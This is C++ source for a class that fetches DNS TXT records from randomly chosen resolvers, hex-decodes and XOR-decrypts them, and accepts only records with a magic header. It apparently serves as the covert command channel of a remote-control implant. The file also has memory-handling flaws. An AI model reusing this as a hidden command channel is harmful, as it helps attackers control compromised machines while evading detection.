#include "dns_query.h"

dns_query::dns_query(string check_domain, string header, string xor_key, vector<string> dns_servers) {
	dns_resolvers = dns_servers;
	xor_pass = xor_key;
	domain = check_domain;
	magic_header = header;
}

const char* dns_query::choose_dns_server(void) {
	return dns_resolvers[rand() % dns_resolvers.size() + 0].c_str();
}

bool dns_query::is_correct_header(string record) {
	size_t record_len = record.size();
	size_t header_len = magic_header.size();
	if (record_len >= header_len) {
		if (record.substr(0, header_len) == magic_header) {
			return true;
		}
	}
	return false;
}

string dns_query::get_txt_results(void) {
	#ifdef __linux__
	u_char nsbuf[4096];
	char dispbuf[4096];
	// need to zero out structs
	ns_msg msg = { 0 };
	ns_rr rr = { 0 };
	res_init();
	_res.nscount = 1;
	_res.retry = 3;
	_res.retrans = 4;
	_res.nsaddr_list[0].sin_family = AF_INET;
	_res.nsaddr_list[0].sin_addr.s_addr = inet_addr(choose_dns_server());
	_res.nsaddr_list[0].sin_port = htons(53);
	int query_response = res_query(domain.c_str(), ns_c_any, ns_t_txt, nsbuf, sizeof(nsbuf));
	if (query_response != -1) {
		ns_initparse(nsbuf, query_response, &msg);
		size_t msg_len = ns_msg_count(msg, ns_s_an);
		for (int msg_index = 0; msg_index < msg_len; msg_index++)
		{
			int prr = ns_parserr(&msg, ns_s_an, msg_index, &rr);
			if (prr == 0) {
				ns_sprintrr(&msg, &rr, NULL, NULL, dispbuf, sizeof(dispbuf));
				const unsigned char* rdata = ns_rr_rdata(rr) + 1;
				string record = reinterpret_cast<const char*> (rdata);
				if (!record.empty()) {
					record = c.xor_operation(c.hex_decode(record), xor_pass);
					if (!record.empty() && is_correct_header(record)) {
						return record;
					}
				}
			}
		}
	}
	#elif _WIN32
	// https://support.microsoft.com/en-us/help/831226/how-to-use-the-dnsquery-function-to-resolve-host-names-and-host-addres
	PIP4_ARRAY dns_servers = { 0 };
	dns_servers = (PIP4_ARRAY)LocalAlloc(LPTR, sizeof(IP4_ARRAY));
	if (!dns_servers) {
		printf("Memory allocation failed \n");
	}
	dns_servers->AddrCount = 1;
	dns_servers->AddrArray[0] = inet_addr(choose_dns_server()); //DNS server IP address
	PDNS_RECORD domain_results = { 0 };
	DNS_STATUS txt_lookup = DnsQuery_A(domain.c_str(), DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_WIRE_ONLY | DNS_QUERY_NO_HOSTS_FILE, &dns_servers, &domain_results, 0);
	if (!txt_lookup) {
		while (domain_results) {
			if (domain_results->wType == DNS_TYPE_TEXT) {
				// https://docs.microsoft.com/en-us/windows/win32/api/windns/ns-windns-dns_txt_dataw
				if (domain_results->Data.TXT.dwStringCount) {
					string record =  (char*)*domain_results->Data.TXT.pStringArray;
					if (!record.empty()) {
						record = c.xor_operation(c.hex_decode(record), xor_pass);
						if (!record.empty() && is_correct_header(record)) {
							LocalFree(domain_results);
							return record;
						}
					}
				}
			}
			domain_results = domain_results->pNext;
		}
	}
	LocalFree(domain_results);
	#else
	#endif
	return string();
}